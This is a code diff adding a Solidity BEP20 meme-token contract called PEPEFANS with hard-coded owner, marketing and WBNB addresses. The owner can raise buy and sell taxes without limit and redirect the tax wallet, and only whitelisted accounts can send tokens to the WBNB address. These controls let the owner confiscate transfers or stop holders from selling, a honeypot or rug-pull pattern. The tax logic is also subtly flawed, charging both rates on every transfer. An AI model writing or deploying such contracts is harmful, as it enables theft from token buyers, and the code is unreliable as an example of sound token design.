@@ -1,0 +1,170 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+interface IBEP20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract PEPEFANSToken is IBEP20 {
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    
+    uint256 private _totalSupply;
+    
+    address private immutable _developerWallet;
+    address private _marketingWallet;
+    address private immutable _bnbContractAddress;
+    
+    uint256 private _buyTaxPercentage;
+    uint256 private _sellTaxPercentage;
+    uint256 private _swapTokensAtAmount;
+    bool private _swapTransferFeesEnabled;
+    mapping(address => bool) private _whitelistedAccounts;
+    bool private _tradingEnabled;
+    bool private _swappingEnabled;
+    
+    modifier onlyOwner() {
+        require(msg.sender == _developerWallet, "Only owner can perform this action");
+        _;
+    }
+    
+    constructor() {
+        _name = "PEPEFANS";
+        _symbol = "PEPEF";
+        _decimals = 18;
+        
+        _developerWallet = 0x6c837E921B81234c078a50A369D8f1eC81A0CB23;
+        _marketingWallet = 0xBF8291b091ef633AFc8D42b9bB146F8a43CB7993;
+        _bnbContractAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+        
+        _totalSupply = 420690000000000000000000000000000;
+        _buyTaxPercentage = 3;
+        _sellTaxPercentage = 3;
+        _swapTokensAtAmount = 1000000 * 10**_decimals;
+        _swapTransferFeesEnabled = true;
+        _tradingEnabled = false;
+        _swappingEnabled = false;
+        
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+    
+    function name() public view returns (string memory) {
+        return _name;
+    }
+    
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+    
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+    
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+    
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+    
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+    
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+    
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+    
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+        return true;
+    }
+    
+    function setMarketingWallet(address walletAddress) public onlyOwner {
+        _marketingWallet = walletAddress;
+    }
+    
+    function setBuyTaxes(uint256 taxPercentage) public onlyOwner {
+        _buyTaxPercentage = taxPercentage;
+    }
+    
+    function setSellTaxes(uint256 taxPercentage) public onlyOwner {
+        _sellTaxPercentage = taxPercentage;
+    }
+    
+    function setSwapTokensAtAmount(uint256 amount) public onlyOwner {
+        _swapTokensAtAmount = amount;
+    }
+    
+    function setSwapTransferFees(bool enabled) public onlyOwner {
+        _swapTransferFeesEnabled = enabled;
+    }
+    
+    function setWhitelistStatus(address account, bool whitelisted) public onlyOwner {
+        _whitelistedAccounts[account] = whitelisted;
+    }
+    
+    function setTradingEnabled(bool enabled) public onlyOwner {
+        _tradingEnabled = enabled;
+    }
+    
+    function setSwappingEnabled(bool enabled) public onlyOwner {
+        _swappingEnabled = enabled;
+    }
+    
+    function _transfer(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "Transfer from the zero address");
+        require(recipient != address(0), "Transfer to the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+        require(_balances[sender] >= amount, "Insufficient balance");
+        
+        uint256 taxAmount;
+        if (_swappingEnabled && sender != address(this) && recipient == _bnbContractAddress) {
+            require(_whitelistedAccounts[sender], "Sender is not whitelisted for swapping");
+            taxAmount = 0;
+        } else if (_tradingEnabled && sender != address(this) && recipient != address(this)) {
+            taxAmount = amount * (_sellTaxPercentage + _buyTaxPercentage) / 100;
+        } else {
+            taxAmount = 0;
+        }
+        
+        uint256 transferAmount = amount - taxAmount; // Calculate the transfer amount
+        
+        _balances[sender] -= amount;
+        _balances[recipient] += transferAmount;
+        _balances[_marketingWallet] += taxAmount;
+        
+        emit Transfer(sender, recipient, transferAmount);
+        emit Transfer(sender, _marketingWallet, taxAmount);
+    }
+    
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "Approve from the zero address");
+        require(spender != address(0), "Approve to the zero address");
+        
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+}
